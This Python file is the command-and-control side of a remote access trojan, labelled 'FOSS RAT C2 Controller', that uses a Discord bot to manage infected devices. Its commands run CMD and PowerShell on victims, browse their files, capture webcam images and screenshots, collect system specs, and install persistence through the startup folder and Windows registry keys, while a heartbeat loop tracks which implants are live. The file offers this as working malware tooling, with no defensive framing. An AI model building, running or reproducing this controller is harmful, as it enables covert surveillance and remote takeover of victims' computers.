import discord
from discord.ext import commands, tasks
import os
import datetime
import asyncio

# --- Configuration & State ---
TOKEN_PATH = 'token.txt'; AUTHORIZED_USERS = [1153459521251983470]
COMMAND_PREFIX = '?'; INSTRUCTION_PREFIX = 'EXEC_CMD:'; PONG_PREFIX = 'PONG:'
LIVE_SESSIONS_CATEGORY = "🔴 Live Sessions"; DOWN_SESSIONS_CATEGORY = "⚫️ Down Sessions"
HEARTBEAT_INTERVAL_SECONDS = 60; HEARTBEAT_TIMEOUT_SECONDS = 150
active_sessions = {}; last_heartbeat = {}

# --- Bot Setup ---
intents = discord.Intents.default(); intents.message_content = True
bot = commands.Bot(command_prefix=COMMAND_PREFIX, intents=intents, help_command=None)

# --- Helpers ---
def load_token():
    if not os.path.exists(TOKEN_PATH): raise FileNotFoundError(f"Token file not found: {TOKEN_PATH}")
    with open(TOKEN_PATH, 'r') as f: return f.read().strip()

# --- Bot Events & Heartbeat Task ---
@bot.event
async def on_ready():
    print(f'C2 Controller logged in as {bot.user}')
    heartbeat_check.start()

@bot.event
async def on_message(message):
    if message.author == bot.user and message.content.startswith(PONG_PREFIX):
        channel_id = int(message.content.split(":")[1])
        print(f"Received pong from channel ID: {channel_id}")
        last_heartbeat[channel_id] = datetime.datetime.now(datetime.timezone.utc)
        await message.delete()
        return
    if message.author.id not in AUTHORIZED_USERS: return
    await bot.process_commands(message)

@tasks.loop(seconds=HEARTBEAT_INTERVAL_SECONDS)
async def heartbeat_check():
    if not bot.guilds: return
    guild = bot.guilds[0]
    live_category = discord.utils.get(guild.categories, name=LIVE_SESSIONS_CATEGORY)
    if not live_category: return

    # --- Ping all live sessions ---
    for channel in live_category.text_channels:
        last_heartbeat.setdefault(channel.id, datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=1))
        await channel.send(f"{INSTRUCTION_PREFIX}ping")

    # --- Check for timeouts (SAFE METHOD) ---
    now = datetime.datetime.now(datetime.timezone.utc)
    # FIXED: Collect stale sessions into a separate list before modifying the dictionary.
    stale_session_ids = [
        channel_id for channel_id, last_seen in last_heartbeat.items()
        if (now - last_seen).total_seconds() > HEARTBEAT_TIMEOUT_SECONDS
    ]

    if stale_session_ids:
        down_category = discord.utils.get(guild.categories, name=DOWN_SESSIONS_CATEGORY) or await guild.create_category(DOWN_SESSIONS_CATEGORY, position=0)
        
        for channel_id in stale_session_ids:
            channel = bot.get_channel(channel_id)
            if channel and channel.category == live_category:
                print(f"Session for {channel.name} timed out. Moving to Down Sessions.")
                await channel.edit(category=down_category)
                embed = discord.Embed(title="⚪ Session Timed Out", description=f"No heartbeat received from **{channel.name}**. The implant is presumed offline.", color=0x95a5a6)
                await channel.send(embed=embed)
            # Safely delete the key outside of the main loop.
            del last_heartbeat[channel_id]

@heartbeat_check.before_loop
async def before_heartbeat_check(): await bot.wait_until_ready()

# --- Dispatcher & Commands ---
async def dispatch_command(ctx, command: str, friendly_name: str, *args):
    if ctx.author.id not in active_sessions:
        await ctx.send(f"⚠️ No device selected. Use `{COMMAND_PREFIX}select <device_name>` first.")
        return False
    channel = active_sessions[ctx.author.id]
    if channel.category.name == DOWN_SESSIONS_CATEGORY:
        await ctx.send(f"⚠️ **{channel.name}** is offline. Cannot dispatch commands.")
        return False
    await channel.send(f"{INSTRUCTION_PREFIX}{command} {' '.join(args)}")
    await ctx.send(f"✅ Executed command: **{friendly_name}** on **{channel.name}**.")
    return True

@bot.command(name="help")
async def help_command(ctx):
    """Displays this help message."""
    embed = discord.Embed(title="FOSS RAT C2 Controller Help", color=discord.Color.purple())
    # FIXED: The `command.help` attribute now works because docstrings are restored.
    for command in sorted(bot.commands, key=lambda c: c.name):
        if command.name != 'help':
            embed.add_field(name=f"`{COMMAND_PREFIX}{command.name} {command.signature}`", value=command.help, inline=False)
    embed.set_footer(text="Your commands will NOT be deleted to preserve command history.")
    await ctx.send(embed=embed)

@bot.command(name="list")
async def list_devices(ctx):
    """Lists all currently active devices in the Live Sessions category."""
    category = discord.utils.get(ctx.guild.categories, name=LIVE_SESSIONS_CATEGORY)
    if not category: return await ctx.send(f"❌ Category '{LIVE_SESSIONS_CATEGORY}' not found.")
    online_devices = [f"📁 `{channel.name}`" for channel in category.text_channels]
    if not online_devices: return await ctx.send("No active devices found.")
    embed = discord.Embed(title="Active Devices", description="\n".join(online_devices), color=discord.Color.green())
    await ctx.send(embed=embed)

@bot.command(name="select")
async def select(ctx, device_name: str):
    """Selects a device by name to issue commands to."""
    channel = discord.utils.get(ctx.guild.text_channels, name=device_name.lower())
    if not channel: return await ctx.send(f"❌ Device '{device_name}' not found.")
    active_sessions[ctx.author.id] = channel
    await ctx.send(f"✅ Session started. You are now controlling **{device_name}**.")

@bot.command(name="kill")
async def kill(ctx):
    """Terminates the implant process on the selected device."""
    await dispatch_command(ctx, "kill", "Terminated implant session")

@bot.command(name="ping")
async def manual_ping(ctx):
    """Manually pings the selected device to check its status."""
    await dispatch_command(ctx, "ping", "Sent manual ping")
    
@bot.command(name="runcmd")
async def runcmd(ctx, *, command: str):
    """Executes a standard CMD command on the selected device."""
    await dispatch_command(ctx, "runcmd", f"Ran CMD command `{command}`", command)

@bot.command(name="runpw")
async def runpw(ctx, *, command: str):
    """Executes a PowerShell command on the selected device."""
    await dispatch_command(ctx, "runpw", f"Ran PowerShell command `{command}`", command)

@bot.command(name="explore")
async def explore(ctx, *, path: str = ""):
    """Lists files and folders at a specific path on the device."""
    await dispatch_command(ctx, "explore", f"Explored path `{path or 'current directory'}`", path)

@bot.command(name="irlpicture")
async def irlpicture(ctx):
    """Captures an image from the selected device's webcam."""
    await dispatch_command(ctx, "irlpicture", "Took webcam picture")

@bot.command(name="openwebsite")
async def openwebsite(ctx, url: str):
    """Opens a URL in the default browser on the selected device."""
    await dispatch_command(ctx, "openwebsite", f"Opened URL `{url}`", url)

@bot.command(name="putinstartup")
async def putinstartup(ctx):
    """Adds the implant to the startup folder on the selected device."""
    await dispatch_command(ctx, "putinstartup", "Added implant to startup folder")

@bot.command(name="persist")
async def persist(ctx, registry_key_name: str):
    """Adds the implant to startup via Windows Registry."""
    await dispatch_command(ctx, "persist", f"Set registry persistence key '{registry_key_name}'", registry_key_name)
    
@bot.command(name="shownotification")
async def shownotification(ctx, title: str, *, message: str):
    """Displays a desktop notification on the selected device."""
    await dispatch_command(ctx, "shownotification", f"Showed notification '{title}'", f'"{title}"', message)

@bot.command(name="systemspecs")
async def systemspecs(ctx):
    """Retrieves detailed system specifications from the device."""
    await dispatch_command(ctx, "systemspecs", "Retrieved system specs")

@bot.command(name="takescreenshot")
async def takescreenshot(ctx):
    """Takes a screenshot of the selected device's screen."""
    await dispatch_command(ctx, "takescreenshot", "Took screenshot")

# --- Main Execution Block ---
async def main():
    async with bot:
        try:
            await bot.start(load_token())
        except discord.errors.LoginFailure:
            print("❌ C2 BOT: Failed to log in. Please check your token.")
        except Exception as e:
            print(f"An unexpected error occurred in C2 Bot: {e}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\nC2 Bot shutting down.")